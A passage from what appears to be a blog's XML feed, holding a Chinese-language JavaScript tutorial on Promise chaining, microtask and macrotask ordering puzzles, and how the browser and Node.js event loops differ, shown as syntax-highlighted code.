punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">var</span> c <span class="token operator">=</span> <span class="token string">'I love you'</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a <span class="token operator">+</span> b <span class="token operator">+</span> c<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 改进：高阶函数 + promise链式调用</span><span class="token keyword">function</span> f <span class="token punctuation">(</span>str<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>param<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span>reject<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>      <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token function">resolve</span><span class="token punctuation">(</span>param <span class="token operator">+</span><span class="token operator">=</span> str<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">var</span> p1 <span class="token operator">=</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token string">'hello '</span><span class="token punctuation">)</span><span class="token keyword">var</span> p2 <span class="token operator">=</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token string">'lagou '</span><span class="token punctuation">)</span><span class="token keyword">var</span> p3 <span class="token operator">=</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token string">'I love you'</span><span class="token punctuation">)</span><span class="token function">p1</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token function">p2</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token function">p3</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">p1</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>p3<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>console<span class="token punctuation">.</span>log<span class="token punctuation">)</span></code></pre><p>红灯3秒亮一次，绿灯1秒亮一次，黄灯2秒亮一次；如何让三个灯不断交替重复亮灯？（用Promise实现）三个亮灯函数已经存在：</p><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">red</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'red'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">green</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'green'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">yellow</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'yellow'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">light</span><span class="token punctuation">(</span>time<span class="token punctuation">,</span> fn<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> reject<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span> time<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">step</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token function">light</span><span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">,</span> red<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token function">light</span><span class="token punctuation">(</span><span class="token number">2000</span><span class="token punctuation">,</span> green<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token function">light</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span> yellow<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token function">step</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token function">step</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><ul><li><strong>只有返回promsie对象后才会链式调用</strong></li></ul><pre class=" language-js"><code class="language-js">Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>res <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>   console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>   <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> reject<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>         <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>            <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token string">'newPromise'</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>res <span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token string">"newPromise1"</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>res<span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">,</span> res<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 1 4 undefined  2 3</span></code></pre><pre class=" language-js"><code class="language-js">Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>res <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>   console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>   <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> reject<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>         <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>            <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token string">'newPromise'</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>res <span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token string">"newPromise1"</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>res<span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">,</span> res<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 1 2  3 4 newPromise1</span></code></pre><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> promise <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> reject<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">reject</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span>promise<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token keyword">catch</span><span class="token punctuation">(</span>e <span class="token operator">=</span><span class="token operator">></span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 1 2 4 3</span><span class="token comment" spellcheck="true">// promise构造函数的代码会立即执行，then或者reject里面的代码会放入异步微任务队列，在宏任务结束后会立即执行。规则二：promise的状态一旦变更为成功或者失败，则不会再次改变，所以执行结果为：1,2,4,3。而catch里面的函数不会再执行。</span></code></pre><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> promise <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> reject<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>             console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'once'</span><span class="token punctuation">)</span>             <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token string">'success'</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>promise<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>       console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>promise<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>     console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 将过一秒打印:once,success,success</span></code></pre><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> p1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> reject<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>         console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">let</span> p2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> reject<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> timeOut1 <span class="token operator">=</span> <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// timeout1 加入宏任务队列</span>          console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// p2.then加入微任务队列</span>         <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// p1.then加入微任务队列</span>    p2<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>              console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> timeOut2 <span class="token operator">=</span> <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// timeout2 加入宏任务队列</span>         console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">const</span> p3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span>reject <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>          <span class="token function">reject</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>res <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>          console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>         <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token function">p1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>         console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 1,2,10,5,6,8,9,3</span></code></pre><blockquote><p>首先执行 script 代码块，我们来分析一下都做了什么：</p><ol><li>定义了 p1 函数，定义的时候p1没有执行，所以这时候内部实现先不看</li><li>执行了 timeout2 函数，返回值（是一个数值）赋值给 timeout2，timeout2加入了宏任务队列</li><li>执行 p1，定义即执行的有输出 1，2，p2.then，p1.then加入微任务队列，timeout1加入宏任务队列</li><li>输出10，执行完 script 宏任务后，清空微任务队列，p2.then =&gt; 5，p1.then =&gt; 6</li><li>找出宏任务，首先执行 timeout2，输出 8 , reject 只是形参起名字实际上还是 resolve，p3.then加入微队列</li><li>Timeout2 宏任务执行结束清空微任务队列，输出9，然后再执行宏任务 timeout1,输出3，此时resolve(4)不会执行，因为p2状态已经成为 fullfilled</li></ol></blockquote><pre class=" language-js"><code class="language-js">Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>console<span class="token punctuation">.</span>log<span class="token punctuation">)</span><span class="token comment" spellcheck="true">// Promise.resolve(1)会返回一个promise对象并且会将1当做then的参数。而.then 或者 .catch 的参数期望是函数，传入非函数则会发生值穿透。所以最后会输出：1。</span></code></pre><pre class=" language-js"><code class="language-js">Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span> x <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span> <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'My Error'</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span>x <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token keyword">catch</span><span class="token punctuation">(</span>console<span class="token punctuation">.</span>error<span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 因为then()和catch()又返回了一个promise，因此，后续调用可以串联起来。</span><span class="token comment" spellcheck="true">// catch 其实是 then(undefined, () => {}) 的语法糖，如下：</span>p<span class="token punctuation">.</span><span class="token keyword">catch</span><span class="token punctuation">(</span>err <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"catch "</span> <span class="token operator">+</span> err<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// catch error</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 等同于</span>p<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>undefined<span class="token punctuation">,</span> err <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"catch "</span> <span class="token operator">+</span> err<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// catch error</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="浏览器事件循环和node事件循环的区别"><a href="#浏览器事件循环和node事件循环的区别" class="headerlink" title="浏览器事件循环和node事件循环的区别"></a>浏览器事件循环和node事件循环的区别</h2><p>Node的事件循环是libuv实现的，大体的task（宏任务）执行顺序是这样的：<a href="http://lynnelv.github.io/img/article/event-loop/ma(i" target="_blank" rel="noopener">图示</a>crotask-in-node.png)</p><ul><li>timers定时器：本阶段执行已经安排的 setTimeout() 和 setInterval() 的回调函数。</li><li>pending callbacks待定回调：执行延迟到下一个循环迭代的 I/O 回调。</li><li>idle, prepare：仅系统内部使用。</li><li>poll 轮询：检索新的 I/O 事件;执行与 I/O 相关的回调（几乎所有情况下，除了关闭的回调函数，它们由计时器和 setImmediate() 排定的之外），其余情况 node 将在此处阻塞。</li><li>check 检测：setImmediate() 回调函数在这里执行。</li><li>close callbacks 关闭的回调函数：一些准备关闭的回调函数，如：socket.on(‘close’, …)。</li></ul><hr><ul><li>Node10以前，<code>microtask</code> 在事件循环的各个阶段之间执行，Node11之后和浏览器行为统一了，都是每执行一个宏任务就把微任务队列清空。</li><li>浏览器端，<code>microtask</code> 在事件循环的 <code>macrotask</code> 执行完之后执行</li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> test <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>   console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'start'</span><span class="token punctuation">)</span>    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'children2'</span><span class="token punctuation">)</span>        Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'children2-1'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'children3'</span><span class="token punctuation">)</span>        Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'children3-1'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>    Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'children1'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'end'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 浏览器端 和 node11之后</span><span class="token comment" spellcheck="true">// start</span><span class="token comment" spellcheck="true">// end</span><span class="token comment" spellcheck="true">// children1</span><span class="token comment" spellcheck="true">// children2</span><span class="token comment" spellcheck="true">// children2-1</span><span class="token comment" spellcheck="true">// children3</span><span class="token comment" spellcheck="true">// children3-1</span><span class="token comment" spellcheck="true">// node10之前</span><span class="token comment" spellcheck="true">// start</span><span class="token comment" spellcheck="true">// end</span><span class="token comment" spellcheck="true">// children2</span><span class="token comment" spellcheck="true">// children3</span><span class="token comment" spellcheck="true">// children2-1</span><span class="token comment" spellcheck="true">// children3-1</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JS数据类型</title>
      <link href="2020/03/05/JavaScript-JS%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/"/>
      <url>2020/03/05/JavaScript-JS%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</url>
      
